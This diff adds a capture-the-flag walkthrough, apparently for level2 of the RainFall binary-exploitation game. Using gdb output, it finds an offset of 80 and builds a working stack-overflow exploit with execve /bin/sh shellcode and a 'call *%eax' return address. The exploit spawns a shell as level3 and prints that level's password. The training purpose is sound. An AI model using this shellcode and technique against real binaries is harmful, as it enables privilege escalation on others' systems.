@@ -1,0 +1,86 @@
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
+
+   0x080484fb <+39>:    and    $0xb0000000,%eax
+   0x08048500 <+44>:    cmp    $0xb0000000,%eax
+
+
+(gdb) r
+Starting program: /home/user/level2/level2 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+For 0x37634136 offset is 80
+
+(gdb) info functions system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xb7e6b060  __libc_systemx/i
+0xb7e6b060  system
+0xb7f49550  svcerr_systemerr
+
+We can't use function system because it has 0xb7e6b060 address and will not pass 0xb0000000 == (num & 0xb0000000) check
+That's why we will use shellcode from  http://www.shell-storm.org/shellcode/index.html for intel 86 (Linux/x86 - Tiny Execve sh Shellcode - 21 bytes by Geyslan G. Bem). To execute shellcode that passed to input we need to know what regster will "control" it.
+
+(gdb) r
+Starting program: /home/user/level2/level2 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7ea912f in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb) i r
+eax            0x414140f5       1094795509
+ecx            0x0      0
+edx            0x1      1
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6ec       0xbffff6ec
+ebp            0x41414141       0x41414141
+esi            0x0      0
+edi            0x0      0
+eip            0xb7ea912f       0xb7ea912f
+eflags         0x210202 [ IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+level2@RainFall:~$ objdump -d  /home/user/level2/level2 | grep -i "jmp"
+...
+...
+
+level2@RainFall:~$ objdump -d  /home/user/level2/level2 | grep -i "call"
+...
+ 80485eb:       ff d0                   call   *%eax
+...
+
+We will overwrite return address with 0x080485eb
+
+level2@RainFall:~$ python
+Python 2.7.3 (default, Jun 22 2015, 19:43:34) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import struct
+>>> struct.pack("<I", 0x080485eb)
+'\xeb\x85\x04\x08'
+>>> quit()
+
+level2@RainFall:~$ (python -c 'print  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x41" * (80 - 21) + "\xeb\x85\x04\x08"' ; cat  ) | ./level2
+j
+ X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+level2@RainFall:~$ su level3
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
